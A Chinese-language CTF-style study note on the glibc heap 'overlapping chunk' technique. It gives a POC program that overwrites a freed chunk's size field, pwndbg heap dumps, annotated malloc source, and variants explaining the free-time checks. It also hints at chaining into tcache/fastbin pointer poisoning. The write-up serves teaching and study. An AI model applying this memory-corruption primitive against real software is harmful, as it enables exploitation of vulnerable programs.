# 前言
这一小节我们介绍overlapping chunk

# POC
## POC源码
```c
/*

 A simple tale of overlapping chunk.
 This technique is taken from
 http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

int main(int argc , char* argv[])
{
	setbuf(stdout, NULL);


	intptr_t *p1,*p2,*p3,*p4;

	printf("\nThis is a simple chunks overlapping problem\n\n");
	printf("Let's start to allocate 3 chunks on the heap\n");

	p1 = malloc(0x500 - 8);
	p2 = malloc(0x500 - 8);
	p3 = malloc(0x80 - 8);

	printf("The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n", p1, p2, p3);

	memset(p1, '1', 0x500 - 8);
	memset(p2, '2', 0x500 - 8);
	memset(p3, '3', 0x80 - 8);

	printf("\nNow let's free the chunk p2\n");
	free(p2);
	printf("The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n");

	printf("Now let's simulate an overflow that can overwrite the size of the\nchunk freed p2.\n");
	printf("For a toy program, the value of the last 3 bits is unimportant;"
		" however, it is best to maintain the stability of the heap.\n");
	printf("To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),"
		" to assure that p1 is not mistaken for a free chunk.\n");

	int evil_chunk_size = 0x581;
	int evil_region_size = 0x580 - 8;
	printf("We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n",
		 evil_chunk_size, evil_region_size);

	/* VULNERABILITY */
	*(p2-1) = evil_chunk_size; // we are overwriting the "size" field of chunk p2
	/* VULNERABILITY */

	printf("\nNow let's allocate another chunk with a size equal to the data\n"
	       "size of the chunk p2 injected size\n");
	printf("This malloc will be served from the previously freed chunk that\n"
	       "is parked in the unsorted bin which size has been modified by us\n");
	p4 = malloc(evil_region_size);

	printf("\np4 has been allocated at %p and ends at %p\n", (char *)p4, (char *)p4+evil_region_size);
	printf("p3 starts at %p and ends at %p\n", (char *)p3, (char *)p3+0x580-8);
	printf("p4 should overlap with p3, in this case p4 includes all p3.\n");

	printf("\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,"
		" and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n");

	printf("Let's run through an example. Right now, we have:\n");
	printf("p4 = %s\n", (char *)p4);
	printf("p3 = %s\n", (char *)p3);

	printf("\nIf we memset(p4, '4', %d), we have:\n", evil_region_size);
	memset(p4, '4', evil_region_size);
	printf("p4 = %s\n", (char *)p4);
	printf("p3 = %s\n", (char *)p3);

	printf("\nAnd if we then memset(p3, '3', 80), we have:\n");
	memset(p3, '3', 80);
	printf("p4 = %s\n", (char *)p4);
	printf("p3 = %s\n", (char *)p3);

	assert(strstr((char *)p4, (char *)p3));
}
```

## POC分析
```c
	p1 = malloc(0x500 - 8);
	p2 = malloc(0x500 - 8);
	p3 = malloc(0x80 - 8);
```

首先上来申请了三个堆块，并且填充了每个堆块的user_data，申请之后堆区内存如下：

```c
pwndbg> x/420gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
......
0x555555757250:	0x0000000000000000	0x0000000000000501 #p1(malloc)
......
0x555555757750:	0x3131313131313131	0x0000000000000501 #p2(malloc)
......
0x555555757c50:	0x3232323232323232	0x0000000000000081 #p3(malloc)
......
0x555555757cd0:	0x3333333333333333	0x0000000000020331 #top_chunk
......
0x555555757d10:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

然后我们free掉p2，让其进入unsortedbin中：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620348566068-3c90d905-2859-4cc7-a8fb-5dcee27cdece.png)

```c
pwndbg> x/420gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
......
0x555555757250:	0x0000000000000000	0x0000000000000501 #p1(malloc)
0x555555757260:	0x3131313131313131	0x3131313131313131
......
0x555555757750:	0x3131313131313131	0x0000000000000501 #p2(free-unsortedbin)
0x555555757760:	0x00007ffff7dcdca0	0x00007ffff7dcdca0
0x555555757770:	0x0000000000000000	0x0000000000000000 #changed
......
0x555555757c50:	0x0000000000000500	0x0000000000000080 #p3(malloc)
    			#changed
......
0x555555757cd0:	0x3333333333333333	0x0000000000020331 #top_chunk
......
0x555555757d10:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

接下来对POC源码的第54行下断点，调试到此处，现在代码执行了：

```c
	/* VULNERABILITY */
	*(p2-1) = evil_chunk_size; // we are overwriting the "size" field of chunk p2
	/* VULNERABILITY */
```

```c
pwndbg> x/420gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
......
0x555555757250:	0x0000000000000000	0x0000000000000501 #p1(malloc)
0x555555757260:	0x3131313131313131	0x3131313131313131
......
0x555555757750:	0x3131313131313131	0x0000000000000581 #p2(free-unsortedbin)
    								#VULNERABILITY
0x555555757760:	0x00007ffff7dcdca0	0x00007ffff7dcdca0
0x555555757770:	0x0000000000000000	0x0000000000000000
......
0x555555757c50:	0x0000000000000500	0x0000000000000080 #p3(malloc)
......
0x555555757cd0:	0x3333333333333333	0x0000000000020331 #top_chunk
......
0x555555757d10:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

接下来我们malloc一个大小为0x578堆块，gdb查看会发现p3堆块已经被吞并：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620477941137-5132acb7-237c-47c2-be8e-feb77aa31de0.png)

让我惊讶的是这里对unsortedbin中的free chunk申请竟然没有对堆块的大小进行检查，算了还是看一下源码是什么吧，引入源码重新调试到此处（b 58 -> r）：

```c
    int iters = 0;
      while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
        {
          bck = victim->bk;
          if (__builtin_expect (chunksize_nomask (victim) <= 2 * SIZE_SZ, 0) //检查堆块的大小
              || __builtin_expect (chunksize_nomask (victim)
				   > av->system_mem, 0)) 
              //虽然这里检查了unsortedbin的大小，但是只是检查了堆块大小是否小的离谱或大的离谱
              //但是并没有检查堆块所占的实际大小与mchunk_size是否相等
            malloc_printerr ("malloc(): memory corruption");
          size = chunksize (victim);

          /*
             If a small request, try to use last remainder if it is the
             only chunk in unsorted bin.  This helps promote locality for
             runs of consecutive small requests. This is the only
             exception to best-fit, and applies only when there is
             no exact fit for a small chunk.
           */

          if (in_smallbin_range (nb) &&
              bck == unsorted_chunks (av) &&
              victim == av->last_remainder &&
              (unsigned long) (size) > (unsigned long) (nb + MINSIZE))
            {
				//省略last_remainder分配......
            }

          /* remove from unsorted list */
          unsorted_chunks (av)->bk = bck; //victim从unsortedbin链表中卸下
          bck->fd = unsorted_chunks (av);

          /* Take now instead of binning if exact fit */

          if (size == nb) //取下来的堆块采用最适算法进行分配
            {
              set_inuse_bit_at_offset (victim, size);
              if (av != &main_arena)
		set_non_main_arena (victim);
#if USE_TCACHE
	      /* Fill cache first, return to user only if cache fills.
		 We may return one of these chunks later.  */
	      if (tcache_nb //若堆块大小合适则会放入tcache中
		  && tcache->counts[tc_idx] < mp_.tcache_count)
		{
		  tcache_put (victim, tc_idx);
		  return_cached = 1;
		  continue;
		}
	      else 
		{
#endif
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p; //直到堆块返回也没有检查victim的大小是否与实际相符
#if USE_TCACHE
		}
#endif
            }
			//......
        }
--------------------------------------------------------------------
pwndbg> x/420gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache
......
0x555555757250:	0x0000000000000000	0x0000000000000501 #p1(malloc)
0x555555757260:	0x3131313131313131	0x3131313131313131
......
0x555555757750:	0x3131313131313131	0x0000000000000581 #p2(malloc)
    								#VULNERABILITY
0x555555757760:	0x00007ffff7dcdca0	0x00007ffff7dcdca0 #指针不会被清空
0x555555757770:	0x0000000000000000	0x0000000000000000
......
0x555555757c50:	0x0000000000000500	0x0000000000000080 #p3(malloc)
......
0x555555757cd0:	0x3333333333333333	0x0000000000020331 #top_chunk
......
0x555555757d10:	0x0000000000000000	0x0000000000000000
pwndbg> 
--------------------------------------------------------------------
```

Q：为什么这里要申请0x578（对齐后mchunk_size==0x581）?

A：这里其实为了让堆块尽早返回，因为后面有可能会有检查机制造成触发异常（尽早返回为好）；还有一点就是这个大小可以完全覆盖下一个相邻堆块，这样可以完全控制。

现在就会造成堆块重叠，接下来就可以为所欲为了：

```c
	printf("\np4 has been allocated at %p and ends at %p\n", (char *)p4, (char *)p4+evil_region_size);
	printf("p3 starts at %p and ends at %p\n", (char *)p3, (char *)p3+0x580-8);
	printf("p4 should overlap with p3, in this case p4 includes all p3.\n");

	printf("\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,"
		" and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n");

	printf("Let's run through an example. Right now, we have:\n");
	printf("p4 = %s\n", (char *)p4);
	printf("p3 = %s\n", (char *)p3);

	printf("\nIf we memset(p4, '4', %d), we have:\n", evil_region_size);
	memset(p4, '4', evil_region_size);
	printf("p4 = %s\n", (char *)p4);
	printf("p3 = %s\n", (char *)p3);

	printf("\nAnd if we then memset(p3, '3', 80), we have:\n");
	memset(p3, '3', 80);
	printf("p4 = %s\n", (char *)p4);
	printf("p3 = %s\n", (char *)p3);

	assert(strstr((char *)p4, (char *)p3));
```

放到题目来说简单来说就是free掉p3堆块让其放入fastbin或tcachebin中，然后修改fd或next指针，然后...你懂的。

# 疑问
为什么要在堆块free进入unsortedbin后在修改堆块的大小，不能free之前修改吗？

首先我们写个例子看一下：

```c
#include<stdio.h>
#include<stdlib.h>
#include <stdint.h>

int main(){
	intptr_t *p1=malloc(0x10);
	intptr_t *p2=malloc(0x500 - 8);
	intptr_t *p3=malloc(0x80); 
	intptr_t *p4=malloc(0x10); //avoid top_chunk
	int fake_size=0x581;
	*(p2-0x1)=fake_size;//VULNERABILITY
	free(p2);
	void *p5=malloc(0x580-8);
	return 0;
}
```

gcc编译更改p2堆块的mchunk_size：

```c
pwndbg> x/270gx 0x555555756000
0x555555756000:	0x0000000000000000	0x0000000000000251 #tcache
.......
0x555555756250:	0x0000000000000000	0x0000000000000021 #p1(malloc)
0x555555756260:	0x0000000000000000	0x0000000000000000
0x555555756270:	0x0000000000000000	0x0000000000000581 #p2(malloc)
    							   #0x0000000000000501
......
0x555555756770:	0x0000000000000000	0x0000000000000091 #p3(malloc)
......
0x555555756800:	0x0000000000000000	0x0000000000000021 #p4(malloc)
0x555555756810:	0x0000000000000000	0x0000000000000000
0x555555756820:	0x0000000000000000	0x00000000000207e1 #top_chunk
......
0x555555756860:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

然后我们引入源码到此处：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620483761861-8cf51a33-a5b2-409d-b051-64dcc187e6d2.png)

```c
    nextchunk = chunk_at_offset(p, size); 
				//nextchunk==0x555555756270+0x580==0x5555557567f0

    /* Lightweight tests: check whether the block is already the
       top block.  */
    if (__glibc_unlikely (p == av->top))
      malloc_printerr ("double free or corruption (top)");
    /* Or whether the next chunk is beyond the boundaries of the arena.  */
    if (__builtin_expect (contiguous (av)
			  && (char *) nextchunk
			  >= ((char *) av->top + chunksize(av->top)), 0))
	malloc_printerr ("double free or corruption (out)");
    /* Or whether the block is actually not marked used.  */
    if (__glibc_unlikely (!prev_inuse(nextchunk)))  //这里会检查到，如下图
        		//prev_inuse(nextchunk)==0
      malloc_printerr ("double free or corruption (!prev)");
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620484422849-1e63ea89-7c1f-40b0-8874-a446fd31189a.png)

这里在计算后nextchunk地址为0x5555557567f0，会将这里当作堆块的起始地址：

```c
pwndbg> x/16gx 0x5555557567f0
0x5555557567f0:	0x0000000000000000	0x0000000000000000
    			#mchunk_prev_size	#mchunk_size
0x555555756800:	0x0000000000000000	0x0000000000000021
0x555555756810:	0x0000000000000000	0x0000000000000000
0x555555756820:	0x0000000000000000	0x00000000000207e1
0x555555756830:	0x0000000000000000	0x0000000000000000
0x555555756840:	0x0000000000000000	0x0000000000000000
0x555555756850:	0x0000000000000000	0x0000000000000000
0x555555756860:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

很明显堆块的prev_inuse(nextchunk)==0，所以会触发异常：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620484708023-674fb95e-db38-448e-a97d-760a898976b4.png)

深究其原因是因为大小更改的不恰当所致，程序改成这样就好可以了：

```c
#include<stdio.h>
#include<stdlib.h>
#include <stdint.h>

int main(){
	intptr_t *p1=malloc(0x10);
	intptr_t *p2=malloc(0x500 - 8);
	intptr_t *p3=malloc(0x80 - 8); //intptr_t *p3=malloc(0x80); 
	intptr_t *p4=malloc(0x10); //avoid top_chunk
	int fake_size=0x581;
	*(p2-0x1)=fake_size;//VULNERABILITY
	free(p2);
	void *p5=malloc(0x580-8);
	return 0;
}
```

最终效果如下：

```c
pwndbg> x/270gx 0x555555756000
0x555555756000:	0x0000000000000000	0x0000000000000251 #tcache
......
0x555555756250:	0x0000000000000000	0x0000000000000021 #p1(malloc)
0x555555756260:	0x0000000000000000	0x0000000000000000
0x555555756270:	0x0000000000000000	0x0000000000000581 #p2(malloc)--------
    							   #0x0000000000000501					 |
0x555555756280:	0x00007ffff7dcdca0	0x00007ffff7dcdca0					 |
......																	 |--实际控制范围
0x555555756770:	0x0000000000000000	0x0000000000000081 #p3(malloc)       |
......																	 |
0x5555557567e0:	0x0000000000000000	0x0000000000000000--------------------
0x5555557567f0:	0x0000000000000580	0x0000000000000021 #p4(malloc)
0x555555756800:	0x0000000000000000	0x0000000000000000
0x555555756810:	0x0000000000000000	0x00000000000207f1 #top_chunk
......
0x555555756860:	0x0000000000000000	0x0000000000000000
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555756000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x555555756250
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x555555756270
Size: 0x581

Allocated chunk | PREV_INUSE
Addr: 0x5555557567f0
Size: 0x21

Top chunk | PREV_INUSE
Addr: 0x555555756810
Size: 0x207f1

pwndbg> 
```

和POC中的效果相同。

# 利用与总结
这种利用方式虽然简单，但是要注意更改mchunk_size在free之前和之后的检查时不一样的；

建议在exp的最后几步使用，因为更改size是件危险的事，一不注意就会触发malloc_printerr（异常）。

**<font style="color:#F5222D;">mchunk_size一定要改正确啊！！！</font>**

